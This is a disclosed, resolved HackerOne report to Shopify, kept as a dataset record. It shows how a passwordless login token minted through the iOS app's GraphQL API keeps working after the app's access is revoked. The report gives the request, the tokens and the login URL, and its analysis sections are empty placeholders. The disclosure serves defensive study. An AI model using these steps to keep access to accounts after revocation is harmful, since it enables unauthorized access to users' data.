---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '172837'
original_report_id: '172837'
title: password less login token expiration issue
weakness: Improper Authentication - Generic
team_handle: shopify
created_at: '2016-09-29T07:28:23.083Z'
disclosed_at: '2016-10-19T15:44:17.559Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 8
tags:
- hackerone
- improper-authentication-generic
---

# password less login token expiration issue

## Metadata

- HackerOne Report ID: 172837
- Weakness: Improper Authentication - Generic
- Program: shopify
- Disclosed At: 2016-10-19T15:44:17.559Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

1. Log into Shopify iOS app as Alice and grab the token.
2. Send the below request to generate the password less login token (The token expires after a single use. So don't use the token).

    Request:
    POST /admin/api/graphql HTTP/1.1
    Host: seclearn.myshopify.com
    Content-Type: application/graphql
    Connection: close
    X-Shopify-Access-Token: f263fb8c544a4cb965d63635a2e1c772
    Accept: application/json
    User-Agent: Shopify Mobile/iPhone OS/5.0 (iPhone6,2/com.jadedpixel.shopify)
    Content-Length: 66
    Accept-Language: en-us
    Accept-Encoding: gzip, deflate

    mutation{adminPasswordlessLogin(input:{}){passwordlessLoginToken}}

    Response:
    {"data":{"adminPasswordlessLogin":{"passwordlessLoginToken":"bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135"}}}

3. From desktop browser, login as Alice and revoke access to Shopify iOS app. It is revoking the access token but password less login token still works. 

    Replace the above login token in the below URL and it logs you in.
https://seclearn.myshopify.com/admin?login_token=bd7ffa6c5bf2969fa15753f8fb8cb427-1475133135

Attack scenario:
1. User gave access to an app.
2. App used the request and kept an unused login token. 
3. User revoked access to the app.
4. App can still use the unused login token and access user's data.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
